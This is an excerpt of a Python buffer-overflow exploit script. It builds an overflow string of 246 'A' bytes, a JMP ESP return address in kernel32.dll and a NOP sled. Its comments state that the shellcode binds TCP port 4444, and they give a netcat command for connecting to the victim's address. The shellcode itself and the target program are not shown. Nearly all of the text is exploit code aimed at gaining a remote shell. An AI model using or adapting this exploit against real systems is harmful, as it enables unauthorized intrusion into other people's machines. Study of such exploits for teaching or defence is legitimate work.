...
# prepare the crash operations
overflow = "\x41" * 246 				# 246 'A' characters: to overflow the input
ret = struct.pack('<L', 0x7C874413) 	# 7C874413 FFE4 JMP ESP kernel32.dll: to jump somewhere, hopefully into the NOP sled
padding = "\x90" * 150					# NOP sled: 150 no-operation commands to catch the jump and slide into shellcode
...
# Shellcode binds target TCP port 4444
# Connect using netcat, eg: nc 192.168.1.37 4444